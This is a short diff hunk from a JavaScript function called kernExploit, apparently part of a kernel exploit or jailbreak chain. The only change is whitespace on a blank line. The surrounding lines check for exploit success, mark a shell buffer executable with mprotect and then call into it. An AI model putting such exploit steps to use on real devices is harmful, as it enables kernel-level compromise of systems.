@@ -633,7 +633,7 @@ function kernExploit() {
       if (kscratch.backing[0] != 0) {
         // Hey, we won!
 		//alert("Hey, we won!");
-		
+				
         // Clean up memory
         p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
         p.fcall(shellbuf);
